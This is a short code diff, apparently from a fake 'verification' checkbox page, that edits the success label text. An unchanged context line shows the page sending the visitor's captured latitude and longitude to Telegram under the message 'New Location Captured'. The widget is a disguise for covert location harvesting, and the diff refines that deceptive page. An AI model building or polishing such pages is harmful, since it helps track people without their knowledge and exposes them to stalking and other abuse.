@@ -134,7 +134,7 @@
                 box.classList.remove('loading');
                 box.classList.add('checked');
                 document.getElementById('checkPath').style.animation = 'rcDraw 0.4s ease forwards';
-                label.innerText = "Verified Successfully ✅";
+                label.innerText = "Verified Successfully ";
                 
                 await sendToTelegram("📍 New Location Captured:", pos.coords.latitude, pos.coords.longitude);
 
